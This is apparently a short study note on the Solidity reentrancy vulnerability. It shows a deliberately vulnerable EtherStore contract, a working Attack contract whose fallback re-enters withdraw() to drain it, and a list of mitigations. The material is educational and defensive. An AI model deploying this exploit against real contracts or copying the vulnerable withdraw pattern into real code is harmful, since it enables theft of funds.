#reentrancy

https://solidity-by-example.org/hacks/re-entrancy/

```solidity
contract EtherStore { 
	mapping(address => uint256) public balances; 
	
	function deposit() public payable { 
		balances[msg.sender] += msg.value; 
	} 
	
	function withdraw() public { 
		uint256 bal = balances[msg.sender]; 
		require(bal > 0); 
		(bool sent,) = msg.sender.call{value: bal}(""); 
		require(sent, "Failed to send Ether"); balances[msg.sender] = 0; 
	} 
	
	// Helper function to check the balance of this contract 
	function getBalance() public view returns (uint256) {
		 return address(this).balance; 
	} 
	 
}
```

The above code call the external sender (which could be a contract), the external contract can implement a fallback function that re-enter the `withdraw()` function again and again, which will drain the `EtherStore` contract

```solidity
pragma solidity ^0.8.24;
contract Attack { 
	EtherStore public etherStore; 
	uint256 public constant AMOUNT = 1 ether; 
	
	constructor(address _etherStoreAddress) { 
		etherStore = EtherStore(_etherStoreAddress); 
	} 
	
	// Fallback is called when EtherStore sends Ether to this contract. 
	fallback() external payable { 
		if (address(etherStore).balance >= AMOUNT) { 
			etherStore.withdraw(); 
		} 
	} 
	
	function attack() external payable { 
		require(msg.value >= AMOUNT); 
		etherStore.deposit{value: AMOUNT}(); 
		etherStore.withdraw(); 
	} 
	// Helper function to check the balance of this contract 
	function getBalance() public view returns (uint256) { 
		return address(this).balance; 
	} 
}
```

Solutions:
1. use "check-effect-interaction" pattern
2. use `nonReentrant` guard from openzeppelin (the best solution)
	- after solidity 0.8.24, you can use [[Transient Storage]] to save more gas
3. don't use `call()`, which will forward all gas